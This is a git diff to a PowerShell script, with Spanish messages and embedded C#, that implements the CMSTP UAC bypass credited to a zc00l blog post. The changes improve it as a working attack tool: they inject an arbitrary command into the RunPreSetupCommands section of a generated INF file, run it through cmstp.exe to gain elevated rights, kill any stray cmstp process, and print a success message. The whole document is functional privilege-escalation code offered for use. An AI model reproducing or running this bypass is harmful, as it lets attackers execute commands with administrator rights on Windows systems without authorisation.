@@ -39,19 +39,33 @@ Este script esta basado en una investigacion del blog de zc00l: https://0x00-0x0
  
      [Parameter()]
      [string]$Command
+
  )
 
+    if (![System.IO.File]::Exists($Executable)) {
+        $Executable =  (Get-Command $Executable).Source
+         if (![System.IO.File]::Exists($Executable)) {
+                Write-Host "[!] Ejecutable no encontrado"
+                exit
+         }
+    }
+    
 
-    if ($Executable.ToLower() -eq "powershell") {
-    if ($Command -ne "") {
-        $final = "powershell -c ""$Command""; Start-Sleep 5"
+    if ($Executable.ToLower() -eq "powershell") 
+    {
+        if ($Command -ne "") {
+            $final = "powershell -c ""$Command"""
     }
  
-  } elseif  ($Executable.ToLower() -eq "cmd") {
-        if ($Command -ne "") {
-        $final = "cmd /c ""$Command"""
+    } elseif  ($Executable.ToLower() -eq "cmd") 
+    {
+        if ($Command -ne "") 
+        {
+            $final = "cmd /c ""$Command"""
         }
-  } else {
+
+  } else 
+  {
     $final =  "$Executable $Command"
   }
 
@@ -78,7 +92,7 @@ CustomDestination=CustInstDestSectionAllUsers
 RunPreSetupCommands=RunPreSetupCommandsSection
 
 [RunPreSetupCommandsSection]
-$final
+LINE
 taskkill /IM cmstp.exe /F
 
 [CustInstDestSectionAllUsers]
@@ -113,6 +127,7 @@ ShortSvcName=""CorpVPN""
         OutputFile.Append(Path.GetRandomFileName().Split(Convert.ToChar("."))[0]);
         OutputFile.Append(".inf");
         StringBuilder newInfData = new StringBuilder(InfData);
+        newInfData.Replace("LINE", CommandToExecute);
         File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
         return OutputFile.ToString();
     }
@@ -142,7 +157,39 @@ ShortSvcName=""CorpVPN""
 
 }
 "@
-Add-Type $code
 
-[CMSTPBypass]::Execute($final) 
+function Execute {
+    try 
+    {
+        $result = [CMSTPBypass]::Execute($final) 
+    } 
+    catch 
+    {
+        Add-Type $code
+        $result = [CMSTPBypass]::Execute($final) 
+    }
+
+    if ($result) {
+        Write-Output "[*] Elevacion exitosa"
+    } 
+    else {
+        Write-Output "[!] Ocurrio un error"
+    }
+}
+
+$process =  ((Get-WmiObject -Class win32_process).name  | Select-String "cmstp" |  Select-Object * -First 1).Pattern
+if ($process -eq "cmstp") {
+    try 
+    {
+         Stop-Process -Name "cmstp"
+         Execute
+    }
+    catch 
+    {
+        Write-Host "[!] Error en la ejecucion de Invoke-UAC, intente cerrar el proceso cmstp.exe"
+    }
+} 
+else {
+    Execute
+}
 }
